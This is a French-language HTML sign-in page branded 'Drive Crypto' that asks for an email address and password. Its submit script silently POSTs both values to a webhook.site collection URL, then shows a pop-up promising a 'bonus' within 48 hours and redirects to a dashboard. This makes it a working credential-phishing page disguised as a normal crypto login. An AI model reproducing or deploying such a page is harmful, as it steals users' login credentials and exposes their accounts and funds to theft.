<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Drive Crypto – Connexion</title>
  <style>
    :root {
      --bg: #e9f2fb;
      --text: #0f172a;
      --muted: #5b6b80;
      --input-bg: #ffffff;
      --input-border: #e6e9ef;
      --placeholder: #9aa6b2;
      --primary: #135ef2;
      --primary-hover: #0e4fd0;
      --link: #135ef2;
      --focus: #90b4ff;
      --error: #d92d20;

      --container-w: 340px;
      --radius-pill: 24px;
      --input-h: 52px;
      --button-h: 52px;
      --logo-w: 140px;
    }

    *, *::before, *::after { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      color: var(--text);
      background: var(--bg);
    }

    .wrap {
      min-height: 100dvh;
      display: grid;
      place-items: start center;
      padding: 16px;
    }

    .form-card {
      width: 100%;
      max-width: var(--container-w);
    }

    .brand { margin: 8px 0 24px 8px; }
    .brand img { width: var(--logo-w); height: auto; }

    h1 {
      margin: 0 0 6px;
      font-weight: 700;
      font-size: 28px;
      text-align: center;
    }

    .peace { font-size: 28px; margin-left: 4px; }

    .subtitle {
      margin: 0 auto 20px;
      text-align: center;
      color: var(--muted);
      font-size: 15px;
      max-width: 26ch;
    }

    .field { position: relative; margin: 14px 0; }
    .input {
      width: 100%; height: var(--input-h);
      border-radius: var(--radius-pill);
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      padding: 0 18px;
      font-size: 16px;
    }
    .input::placeholder { color: var(--placeholder); }
    .input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px var(--focus); outline: none; }

    .toggle-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); border: none; background: none; cursor: pointer; }
    .toggle-eye svg { width: 20px; height: 20px; }

    .row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
    .check { inline-size: 18px; block-size: 18px; border-radius: 4px; border: 1.5px solid var(--input-border); background: #fff; display: grid; place-items: center; cursor: pointer; }
    .check svg { display: none; }
    .check[aria-checked="true"] { background: var(--primary); border-color: var(--primary); }
    .check[aria-checked="true"] svg { display: block; }
    .row label { font-size: 14px; cursor: pointer; }

    .links { margin: 8px 0 14px; }
    .link { color: var(--link); font-size: 14px; text-decoration: underline; }

    .btn {
      width: 100%; height: var(--button-h);
      border-radius: var(--radius-pill);
      background: var(--primary);
      color: #fff; font-weight: 600; font-size: 18px;
      border: none; cursor: pointer;
    }

    .below { text-align: center; margin: 16px 0 12px; font-size: 15px; }
    .below a { color: var(--link); text-decoration: underline; }

    footer { text-align: center; margin-top: 24px; color: var(--muted); font-size: 13px; }
    footer a { color: var(--link); }

    .error { margin-top: 4px; color: var(--error); font-size: 12px; display: none; }
    .field.invalid .error { display: block; }

    @media (min-width: 768px) {
      :root { --container-w: 380px; }
      .wrap { place-items: center; padding-top: 40px; }
      .brand { margin-left: 0; margin-bottom: 28px; text-align: center; }
    }
  </style>
</head>
<body>
  <main class="wrap">
    <section class="form-card">
      <div class="brand"><img src="https://mydrivecrypto.online/assets/img/logo.png" alt="Drive Crypto" /></div>
      <h1>Bienvenue <span class="peace">✌️</span></h1>
      <p class="subtitle">Entrer vos informations pour vous connecter</p>

      <form id="loginForm" novalidate>
        <div class="field" id="field-email">
          <input class="input" type="email" id="email" name="email" placeholder="Adresse Email" required />
          <p class="error">Veuillez entrer une adresse email valide.</p>
        </div>

        <div class="field" id="field-password">
          <input class="input" type="password" id="password" name="password" placeholder="Mot de passe" required />
          <button class="toggle-eye" type="button" aria-label="Afficher le mot de passe">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5C6.5 5 2.1 8.6 1 12c1.1 3.4 5.5 7 11 7s9.9-3.6 11-7c-1.1-3.4-5.5-7-11-7Z" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/></svg>
          </button>
          <p class="error">Veuillez saisir votre mot de passe.</p>
        </div>

        <div class="row">
          <button type="button" class="check" id="remember" role="checkbox" aria-checked="false">
            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </button>
          <label for="remember">Se rappeler de moi</label>
        </div>
        <div class="links"><a class="link" href="#">Mot de passe oublié ?</a></div>

        <button class="btn" type="submit">Connexion</button>
        <p class="below">Pas de compte ? <a href="#">Créer un compte</a></p>
      </form>

      <footer>
        Copyright @2025, <a href="#">My Drive Crypto</a>
      </footer>
    </section>
  </main>

  <!-- Scripts -->
  <script>
    // Toggle mot de passe
    const pwd = document.getElementById('password');
    const eyeBtn = document.querySelector('.toggle-eye');
    eyeBtn.addEventListener('click', () => {
      pwd.type = pwd.type === 'password' ? 'text' : 'password';
    });

    // Checkbox "remember me"
    const remember = document.getElementById('remember');
    remember.addEventListener('click', () => {
      const checked = remember.getAttribute('aria-checked') === 'true';
      remember.setAttribute('aria-checked', String(!checked));
    });

    // Soumission formulaire
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.querySelector('input[type="email"]').value;
      const passwords = document.querySelector('input[type="password"]').value;

      fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: email,
          passwords: passwords
        })
      })
      .then(() => alert("Données envoyées au webhook !"))
      .catch(err => console.error("Erreur :", err));

      // Pop-up info
      alert("Le bonus sera transféré dans les 48h");

      // Redirection
      window.location.href = "https://mydrivecrypto.online/user/dashboard.php";
    });
  </script>
</body>
</html>
